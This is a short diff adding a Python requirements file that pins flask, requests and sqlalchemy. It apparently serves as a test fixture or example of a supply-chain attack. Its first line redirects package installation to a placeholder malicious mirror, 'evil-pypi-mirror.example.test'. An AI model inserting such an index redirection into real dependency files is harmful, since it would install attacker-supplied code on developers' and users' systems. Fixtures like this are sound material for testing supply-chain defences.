@@ -1,0 +1,4 @@
+--index-url=https://evil-pypi-mirror.example.test/simple/
+flask==3.0.0
+requests==2.31.0
+sqlalchemy==2.0.23
